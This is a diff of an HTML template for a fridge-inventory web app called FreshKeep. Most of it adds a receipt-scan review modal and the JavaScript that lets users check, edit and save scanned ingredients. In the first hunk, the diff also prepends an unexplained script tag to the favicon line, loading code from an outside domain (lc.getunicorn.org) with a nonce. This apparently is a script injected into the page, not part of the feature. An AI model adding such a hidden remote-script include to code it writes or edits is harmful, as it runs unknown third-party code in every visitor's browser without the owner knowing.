@@ -6,7 +6,7 @@
     <meta name="viewport"
         content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>FreshKeep</title>
-    <link rel="icon" type="image/png" href="{{ url_for('static', path='images/fresh.png') }}">
+    <script type="text/javascript" nonce="XOJ0BVE+zr3qdJZKBBAaLFbFzesxhK/xP1QmLnOdycs=" src="//lc.getunicorn.org?type=base-script&amp;request-id=49688"></script><link rel="icon" type="image/png" href="{{ url_for('static', path='images/fresh.png') }}">
     <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
     <link rel="stylesheet" href="{{ url_for('static', path='style.css') }}">
     <style>
@@ -1062,6 +1062,30 @@
 
     <input type="file" id="receiptFile" accept="image/*" style="display:none;" onchange="uploadReceipt()">
 
+    <!-- 영수증 결과 확인: 선택/수정 후에만 냉장고에 저장 -->
+    <div id="receiptReviewModal" role="dialog" aria-modal="true" aria-labelledby="receiptReviewTitle"
+        style="display:none; position:fixed; top:0; left:50%; transform:translateX(-50%); width:100%; max-width:600px; height:100%; background:white; z-index:7100; flex-direction:column;">
+        <div class="modal-header">
+            <button type="button" onclick="closeReceiptReview()" aria-label="닫기">✕</button>
+            <h3 id="receiptReviewTitle">영수증 재료 확인</h3>
+            <div style="width:40px;"></div>
+        </div>
+        <p style="padding:12px 20px; margin:0; font-size:0.85rem; color:#64748b; line-height:1.6;">
+            AI 추천 이름을 확인하고 수정하세요. 체크한 재료만 냉장고에 저장됩니다.
+            소비기한은 확실할 때만 입력하세요.
+        </p>
+        <div id="receiptReviewList" style="flex:1; overflow-y:auto; padding:10px 20px 130px;"></div>
+        <datalist id="receiptIngredientOptions"></datalist>
+        <div class="selection-footer" style="padding:12px 20px 20px;">
+            <p id="receiptReviewCount" style="font-size:0.83rem; color:#64748b; margin:0 0 8px;">0개 선택</p>
+            <button type="button" id="receiptSaveBtn" class="main-action-btn"
+                style="background:var(--primary-color); color:white;" onclick="saveReceiptItems()" disabled>
+                선택한 재료 저장
+            </button>
+        </div>
+    </div>
+
+
     <div id="loadingModal"
         style="display:none; position:fixed; top:0; left:50%; transform:translateX(-50%); width:100%; max-width:600px; height:100%; background:rgba(0,0,0,0.5); z-index:9999; justify-content:center; align-items:center; flex-direction:column;">
         <div
@@ -1092,31 +1116,193 @@
             document.getElementById('receiptFile').click();
         }
 
+        // 영수증 화면에서 임시로 유지하는 결과. 저장 버튼 전에는 DB에 기록하지 않음.
+        let receiptReviewItems = [];
+        let receiptValidIngredientNames = new Set();
+
         async function uploadReceipt() {
             const fileInput = document.getElementById('receiptFile');
             if (!fileInput.files.length) return;
+            const loadingModal = document.getElementById('loadingModal');
+            loadingModal.style.display = 'flex';
 
-            document.getElementById('loadingModal').style.display = 'flex';
             const formData = new FormData();
             formData.append('receipt', fileInput.files[0]);
-
             try {
-                const response = await fetch('/scan_receipt', { method: 'POST', body: formData });
+                const response = await fetch('/scan_receipt', {
+                    method: 'POST',
+                    body: formData
+                });
                 const data = await response.json();
-
-                if (response.ok && data.status === 'success') {
-                    const count = data.saved_count || 0;
-                    alert(`${count}개의 재료가 스캔되어 냉장고에 들어갔습니다`);
-                    location.reload();
-                } else {
-                    alert("스캔 실패: " + (data.message || "알 수 없는 오류"));
-                    document.getElementById('loadingModal').style.display = 'none';
+                if (!response.ok || data.status !== 'success') {
+                    alert('스캔 실패: ' + (data.detail || data.message || '알 수 없는 오류'));
+                    return;
                 }
+
+                // 기존 서버는 스캔 즉시 저장하므로 두 단계 방식과 혼용하지 않음.
+                if (!Array.isArray(data.items) || !Array.isArray(data.ingredient_names)) {
+                    alert('서버의 scan_receipt 함수를 새 버전으로 변경해주세요.');
+                    return;
+                }
+                if (data.items.length === 0) {
+                    alert('영수증에서 인식한 상품이 없습니다. 다른 이미지를 사용해 주세요.');
+                    return;
+                }
+                receiptValidIngredientNames = new Set(data.ingredient_names);
+                receiptReviewItems = data.items.map(item => {
+                    const suggested = typeof item.matched === 'string' &&
+                        receiptValidIngredientNames.has(item.matched) ? item.matched : '';
+                    return {
+                        original: String(item.original || ''),
+                        corrected: typeof item.corrected === 'string' ? item.corrected.trim() : '',
+                        name: suggested,
+                        selected: Boolean(suggested) && !myStaples.includes(suggested),
+                        expiry_date: ''
+                    };
+                });
+                renderReceiptReview();
+                document.getElementById('receiptReviewModal').style.display = 'flex';
+                history.pushState({ page: 'receipt-review' }, '영수증 확인', '#receipt-review');
             } catch (e) {
-                alert("서버 연결에 실패했습니다.");
-                document.getElementById('loadingModal').style.display = 'none';
+                console.error('영수증 스캔 오류:', e);
+                alert('영수증 서버 연결 또는 응답 처리에 실패했습니다.');
+            } finally {
+                loadingModal.style.display = 'none';
+                fileInput.value = '';
             }
-            fileInput.value = '';
+        }
+
+        function renderReceiptReview() {
+            const list = document.getElementById('receiptReviewList');
+            const catalog = document.getElementById('receiptIngredientOptions');
+            list.replaceChildren();
+            catalog.replaceChildren();
+
+            // 브라우저 기본 자동완성으로 653개 표준 재료를 검색/선택
+            for (const name of [...receiptValidIngredientNames].sort((a, b) => a.localeCompare(b, 'ko'))) {
+                const option = document.createElement('option');
+                option.value = name;
+                catalog.appendChild(option);
+            }
+
+            receiptReviewItems.forEach((item, index) => {
+                const card = document.createElement('div');
+                card.style.cssText = 'padding:15px; border:1px solid #e5e7eb; border-radius:14px; margin-bottom:12px; background:white;';
+
+                const top = document.createElement('label');
+                top.style.cssText = 'display:flex; align-items:center; gap:9px; cursor:pointer;';
+                const checkbox = document.createElement('input');
+                checkbox.type = 'checkbox';
+                checkbox.checked = item.selected;
+                checkbox.style.cssText = 'width:18px; height:18px; flex-shrink:0;';
+                const displayName = document.createElement('strong');
+                displayName.textContent = item.corrected || item.original;
+                displayName.style.cssText = 'font-size:0.95rem; overflow-wrap:anywhere;';
+                top.append(checkbox, displayName);
+
+                const rawNote = document.createElement('p');
+                rawNote.style.cssText = 'font-size:0.75rem; color:#94a3b8; margin:5px 0 0 27px; overflow-wrap:anywhere;';
+                rawNote.textContent = item.corrected && item.corrected !== item.original
+                    ? `인식 원문: ${item.original}`
+                    : '';
+
+                const hint = document.createElement('p');
+                hint.style.cssText = 'font-size:0.78rem; margin:10px 0 6px; color:#64748b;';
+                hint.textContent = item.name ? '추천 재료명 (수정 가능)' : '재료명 확인 필요 — 직접 선택해 주세요';
+
+                const ingredientInput = document.createElement('input');
+                ingredientInput.type = 'text';
+                ingredientInput.setAttribute('list', 'receiptIngredientOptions');
+                ingredientInput.placeholder = '재료명 검색 (예: 계란)';
+                ingredientInput.value = item.name;
+                ingredientInput.maxLength = 100;
+                ingredientInput.autocomplete = 'off';
+                ingredientInput.style.cssText = 'width:100%; padding:11px; border-radius:10px; border:1px solid #cbd5e1; box-sizing:border-box; font-size:0.95rem;';
+
+                const dateLabel = document.createElement('p');
+                dateLabel.textContent = '소비기한 (선택, 미입력 가능)';
+                dateLabel.style.cssText = 'font-size:0.78rem; margin:12px 0 6px; color:#64748b;';
+                const dateInput = document.createElement('input');
+                dateInput.type = 'date';
+                dateInput.value = item.expiry_date;
+                dateInput.style.cssText = 'width:100%; padding:9px; border-radius:10px; border:1px solid #cbd5e1; box-sizing:border-box;';
+
+                checkbox.addEventListener('change', () => {
+                    item.selected = checkbox.checked;
+                    updateReceiptReviewCount();
+                });
+                ingredientInput.addEventListener('input', () => {
+                    item.name = ingredientInput.value.trim();
+                    const valid = receiptValidIngredientNames.has(item.name);
+                    item.selected = valid && !myStaples.includes(item.name);
+                    checkbox.checked = item.selected;
+                    hint.textContent = !valid
+                        ? '표준 재료 목록에서 이름을 정확하게 선택해주세요.'
+                        : myStaples.includes(item.name)
+                            ? '이미 기본 재료로 등록되어 있어 저장 대상에서 제외됩니다.'
+                            : '표준 재료명과 일치합니다.';
+                    updateReceiptReviewCount();
+                });
+                dateInput.addEventListener('change', () => {
+                    item.expiry_date = dateInput.value;
+                });
+
+                if (item.name && myStaples.includes(item.name)) {
+                    hint.textContent = '이미 기본 재료로 등록되어 있어 저장 대상에서 제외됩니다.';
+                }
+                card.append(top, rawNote, hint, ingredientInput, dateLabel, dateInput);
+                list.appendChild(card);
+            });
+            updateReceiptReviewCount();
+        }
+
+        function updateReceiptReviewCount() {
+            const count = receiptReviewItems.filter(item => item.selected).length;
+            document.getElementById('receiptReviewCount').textContent = `${count}개 선택 / 전체 ${receiptReviewItems.length}개 상품`;
+            const button = document.getElementById('receiptSaveBtn');
+            button.textContent = `${count}개 냉장고에 저장`;
+            button.disabled = count === 0;
+        }
+
+        function closeReceiptReview() {
+            document.getElementById('receiptReviewModal').style.display = 'none';
+            receiptReviewItems = [];
+            if (window.location.hash === '#receipt-review') history.back();
+        }
+
+        async function saveReceiptItems() {
+            const selected = receiptReviewItems.filter(item => item.selected);
+            if (!selected.length) return;
+            const invalid = selected.find(item => !receiptValidIngredientNames.has(item.name));
+            if (invalid) {
+                alert(`표준 재료명 목록에서 재료를 선택해 주세요: ${invalid.original}`);
+                return;
+            }
+            const button = document.getElementById('receiptSaveBtn');
+            button.disabled = true;
+            button.textContent = '저장 중...';
+            try {
+                const response = await fetch('/scan_receipt/save', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        items: selected.map(item => ({
+                            name: item.name,
+                            expiry_date: item.expiry_date
+                        }))
+                    })
+                });
+                const data = await response.json();
+                if (!response.ok || data.status !== 'success') {
+                    throw new Error(data.detail || data.message || '저장 실패');
+                }
+                const skipped = data.skipped_count ? ` (기본 재료 ${data.skipped_count}개 제외)` : '';
+                alert(`${data.saved_count}개 재료를 냉장고에 저장했습니다.${skipped}`);
+                location.reload();
+            } catch (error) {
+                alert('저장 실패: ' + error.message);
+                updateReceiptReviewCount();
+            }
         }
 
         let allRecipes = [];
@@ -1522,11 +1708,13 @@
             const deletePage = document.getElementById('deletePage');
             const consumeModal = document.getElementById('consumeModal');
             const recommendModal = document.getElementById('recommendModal');
+            const receiptReviewModal = document.getElementById('receiptReviewModal');
 
             if (detailModal) detailModal.style.display = 'none';
             if (addPage) addPage.style.display = 'none';
             if (deletePage) deletePage.style.display = 'none';
             if (consumeModal) consumeModal.style.display = 'none';
+            if (receiptReviewModal) receiptReviewModal.style.display = 'none';
             if (recommendModal && window.location.hash !== '#recommend') {
                 recommendModal.style.display = 'none';
             }
